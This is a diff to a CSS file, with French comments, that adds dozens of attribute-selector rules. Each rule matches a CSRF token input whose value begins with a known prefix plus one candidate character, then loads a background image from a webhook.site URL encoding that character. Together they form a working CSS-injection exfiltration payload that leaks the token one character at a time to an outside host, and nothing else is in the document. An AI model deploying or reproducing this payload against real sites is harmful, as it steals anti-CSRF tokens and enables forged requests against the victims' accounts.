@@ -79,3 +79,63 @@ input[name=csrf][value^="ruW-tjL1BWCdhbiOSCA7%"] { background-image: url(https:/
 input[name=csrf][value^="ruW-tjL1BWCdhbiOSCA7^"] { background-image: url(https://webhook.site/b943f931-9935-4f24-ac55-c78b181a80b9?^); }
 input[name=csrf][value^="ruW-tjL1BWCdhbiOSCA7&"] { background-image: url(https://webhook.site/b943f931-9935-4f24-ac55-c78b181a80b9?&); }
 input[name=csrf][value^="ruW-tjL1BWCdhbiOSCA7*"] { background-image: url(https://webhook.site/b943f931-9935-4f24-ac55-c78b181a80b9?*); }
+
+/* Caractères additionnels (espaces, ponctuation, opérateurs, crochets, accents, symboles, emoji) */
+
+input[name=csrf][value^="ruW-tjL1BWCdhbiOSCA7 "] { background-image: url(https://webhook.site/b943f931-9935-4f24-ac55-c78b181a80b9?%20); } /* espace */
+input[name=csrf][value^="ruW-tjL1BWCdhbiOSCA7+"] { background-image: url(https://webhook.site/b943f931-9935-4f24-ac55-c78b181a80b9?%2B); }
+input[name=csrf][value^="ruW-tjL1BWCdhbiOSCA7/"] { background-image: url(https://webhook.site/b943f931-9935-4f24-ac55-c78b181a80b9?%2F); }
+input[name=csrf][value^="ruW-tjL1BWCdhbiOSCA7\\"] { background-image: url(https://webhook.site/b943f931-9935-4f24-ac55-c78b181a80b9?%5C); } /* backslash échappé */
+input[name=csrf][value^="ruW-tjL1BWCdhbiOSCA7:"] { background-image: url(https://webhook.site/b943f931-9935-4f24-ac55-c78b181a80b9?%3A); }
+input[name=csrf][value^="ruW-tjL1BWCdhbiOSCA7;"] { background-image: url(https://webhook.site/b943f931-9935-4f24-ac55-c78b181a80b9?%3B); }
+input[name=csrf][value^="ruW-tjL1BWCdhbiOSCA7,"] { background-image: url(https://webhook.site/b943f931-9935-4f24-ac55-c78b181a80b9?%2C); }
+input[name=csrf][value^="ruW-tjL1BWCdhbiOSCA7="] { background-image: url(https://webhook.site/b943f931-9935-4f24-ac55-c78b181a80b9?%3D); }
+input[name=csrf][value^="ruW-tjL1BWCdhbiOSCA7?"] { background-image: url(https://webhook.site/b943f931-9935-4f24-ac55-c78b181a80b9?%3F); }
+input[name=csrf][value^="ruW-tjL1BWCdhbiOSCA7|"] { background-image: url(https://webhook.site/b943f931-9935-4f24-ac55-c78b181a80b9?%7C); }
+input[name=csrf][value^="ruW-tjL1BWCdhbiOSCA7`"] { background-image: url(https://webhook.site/b943f931-9935-4f24-ac55-c78b181a80b9?%60); }
+input[name=csrf][value^="ruW-tjL1BWCdhbiOSCA7'"] { background-image: url(https://webhook.site/b943f931-9935-4f24-ac55-c78b181a80b9?%27); }
+input[name=csrf][value^="ruW-tjL1BWCdhbiOSCA7\""] { background-image: url(https://webhook.site/b943f931-9935-4f24-ac55-c78b181a80b9?%22); } /* guillemet double échappé */
+input[name=csrf][value^="ruW-tjL1BWCdhbiOSCA7<"] { background-image: url(https://webhook.site/b943f931-9935-4f24-ac55-c78b181a80b9?%3C); }
+input[name=csrf][value^="ruW-tjL1BWCdhbiOSCA7>"] { background-image: url(https://webhook.site/b943f931-9935-4f24-ac55-c78b181a80b9?%3E); }
+input[name=csrf][value^="ruW-tjL1BWCdhbiOSCA7{"] { background-image: url(https://webhook.site/b943f931-9935-4f24-ac55-c78b181a80b9?%7B); }
+input[name=csrf][value^="ruW-tjL1BWCdhbiOSCA7}"] { background-image: url(https://webhook.site/b943f931-9935-4f24-ac55-c78b181a80b9?%7D); }
+input[name=csrf][value^="ruW-tjL1BWCdhbiOSCA7["] { background-image: url(https://webhook.site/b943f931-9935-4f24-ac55-c78b181a80b9?%5B); }
+input[name=csrf][value^="ruW-tjL1BWCdhbiOSCA7]"] { background-image: url(https://webhook.site/b943f931-9935-4f24-ac55-c78b181a80b9?%5D); }
+input[name=csrf][value^="ruW-tjL1BWCdhbiOSCA7<="] { background-image: url(https://webhook.site/b943f931-9935-4f24-ac55-c78b181a80b9?%3C%3D); }
+input[name=csrf][value^="ruW-tjL1BWCdhbiOSCA7=>"] { background-image: url(https://webhook.site/b943f931-9935-4f24-ac55-c78b181a80b9?%3D%3E); }
+
+/* signes monétaires & symboles typographiques */
+input[name=csrf][value^="ruW-tjL1BWCdhbiOSCA7€"] { background-image: url(https://webhook.site/b943f931-9935-4f24-ac55-c78b181a80b9?%E2%82%AC); }
+input[name=csrf][value^="ruW-tjL1BWCdhbiOSCA7£"] { background-image: url(https://webhook.site/b943f931-9935-4f24-ac55-c78b181a80b9?%C2%A3); }
+input[name=csrf][value^="ruW-tjL1BWCdhbiOSCA7¥"] { background-image: url(https://webhook.site/b943f931-9935-4f24-ac55-c78b181a80b9?%C2%A5); }
+input[name=csrf][value^="ruW-tjL1BWCdhbiOSCA7©"] { background-image: url(https://webhook.site/b943f931-9935-4f24-ac55-c78b181a80b9?%C2%A9); }
+input[name=csrf][value^="ruW-tjL1BWCdhbiOSCA7®"] { background-image: url(https://webhook.site/b943f931-9935-4f24-ac55-c78b181a80b9?%C2%AE); }
+input[name=csrf][value^="ruW-tjL1BWCdhbiOSCA7™"] { background-image: url(https://webhook.site/b943f931-9935-4f24-ac55-c78b181a80b9?%E2%84%A2); }
+input[name=csrf][value^="ruW-tjL1BWCdhbiOSCA7°"] { background-image: url(https://webhook.site/b943f931-9935-4f24-ac55-c78b181a80b9?%C2%B0); }
+input[name=csrf][value^="ruW-tjL1BWCdhbiOSCA7±"] { background-image: url(https://webhook.site/b943f931-9935-4f24-ac55-c78b181a80b9?%C2%B1); }
+input[name=csrf][value^="ruW-tjL1BWCdhbiOSCA7µ"] { background-image: url(https://webhook.site/b943f931-9935-4f24-ac55-c78b181a80b9?%C2%B5); }
+input[name=csrf][value^="ruW-tjL1BWCdhbiOSCA7§"] { background-image: url(https://webhook.site/b943f931-9935-4f24-ac55-c78b181a80b9?%C2%A7); }
+input[name=csrf][value^="ruW-tjL1BWCdhbiOSCA7•"] { background-image: url(https://webhook.site/b943f931-9935-4f24-ac55-c78b181a80b9?%E2%80%A2); }
+input[name=csrf][value^="ruW-tjL1BWCdhbiOSCA7…"] { background-image: url(https://webhook.site/b943f931-9935-4f24-ac55-c78b181a80b9?%E2%80%A6); }
+input[name=csrf][value^="ruW-tjL1BWCdhbiOSCA7–"] { background-image: url(https://webhook.site/b943f931-9935-4f24-ac55-c78b181a80b9?%E2%80%93); } /* en-dash */
+input[name=csrf][value^="ruW-tjL1BWCdhbiOSCA7—"] { background-image: url(https://webhook.site/b943f931-9935-4f24-ac55-c78b181a80b9?%E2%80%94); } /* em-dash */
+
+/* Caractères accentués courants (UTF-8 encodés dans l'URL) */
+input[name=csrf][value^="ruW-tjL1BWCdhbiOSCA7é"] { background-image: url(https://webhook.site/b943f931-9935-4f24-ac55-c78b181a80b9?%C3%A9); }
+input[name=csrf][value^="ruW-tjL1BWCdhbiOSCA7è"] { background-image: url(https://webhook.site/b943f931-9935-4f24-ac55-c78b181a80b9?%C3%A8); }
+input[name=csrf][value^="ruW-tjL1BWCdhbiOSCA7à"] { background-image: url(https://webhook.site/b943f931-9935-4f24-ac55-c78b181a80b9?%C3%A0); }
+input[name=csrf][value^="ruW-tjL1BWCdhbiOSCA7ç"] { background-image: url(https://webhook.site/b943f931-9935-4f24-ac55-c78b181a80b9?%C3%A7); }
+input[name=csrf][value^="ruW-tjL1BWCdhbiOSCA7ô"] { background-image: url(https://webhook.site/b943f931-9935-4f24-ac55-c78b181a80b9?%C3%B4); }
+input[name=csrf][value^="ruW-tjL1BWCdhbiOSCA7ü"] { background-image: url(https://webhook.site/b943f931-9935-4f24-ac55-c78b181a80b9?%C3%BC); }
+input[name=csrf][value^="ruW-tjL1BWCdhbiOSCA7ñ"] { background-image: url(https://webhook.site/b943f931-9935-4f24-ac55-c78b181a80b9?%C3%B1); }
+
+/* Autres symboles & ponctuation */
+input[name=csrf][value^="ruW-tjL1BWCdhbiOSCA7<script"] { background-image: url(https://webhook.site/b943f931-9935-4f24-ac55-c78b181a80b9?%3Cscript); }
+input[name=csrf][value^="ruW-tjL1BWCdhbiOSCA7//"] { background-image: url(https://webhook.site/b943f931-9935-4f24-ac55-c78b181a80b9?%2F%2F); }
+input[name=csrf][value^="ruW-tjL1BWCdhbiOSCA7/*"] { background-image: url(https://webhook.site/b943f931-9935-4f24-ac55-c78b181a80b9?%2F*); }
+input[name=csrf][value^="ruW-tjL1BWCdhbiOSCA7*/"] { background-image: url(https://webhook.site/b943f931-9935-4f24-ac55-c78b181a80b9?*/); }
+input[name=csrf][value^="ruW-tjL1BWCdhbiOSCA7<!--"] { background-image: url(https://webhook.site/b943f931-9935-4f24-ac55-c78b181a80b9?%3C!--); }
+
+/* Emoji (exemple) */
+input[name=csrf][value^="ruW-tjL1BWCdhbiOSCA7🙂"] { background-image: url(https://webhook.site/b943f931-9935-4f24-ac55-c78b181a80b9?%F0%9F%99%82); }
+
